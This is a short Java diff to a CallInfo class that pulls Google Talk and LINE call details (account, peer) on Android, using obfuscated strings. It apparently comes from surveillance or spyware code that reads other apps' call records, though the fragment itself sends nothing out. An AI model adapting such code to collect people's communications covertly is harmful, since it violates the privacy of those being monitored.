@@ -172,7 +172,7 @@ public class CallInfo {
 			// open DB
 			if (end) {
 				ret = ChatGoogle.getCurrentCall(this);
-				this.account = ChatGoogle.getPhone();
+				this.account = ChatGoogle.getOwner(-1).getPhone();
 			} else {
 				this.account = M.e("delay");
 				this.peer = M.e("delay");
@@ -182,28 +182,7 @@ public class CallInfo {
 				Check.log(TAG + " gtalk (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
 			}
 			return ret;
-				/*
 
-			if (end) {
-				return true;
-			}
-			this.processName = M.e("com.google.android.talk");
-			// open DB
-			String account = ChatGoogle.getPhone();
-			this.account = account;
-			this.delay = false;
-			this.realRate = false;
-
-			if(account == null){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (update) ERROR, cannot read gtalk account ");
-					return false;
-				}
-			}
-			boolean ret = false;
-			ret = ChatGoogle.getCurrentCall(this);
-			return ret;
-			*/
 		} else if (this.programId == PRG_LINE_ID) {
 			boolean ret = false;
 			this.processName = M.e("jp.naver.line.android");
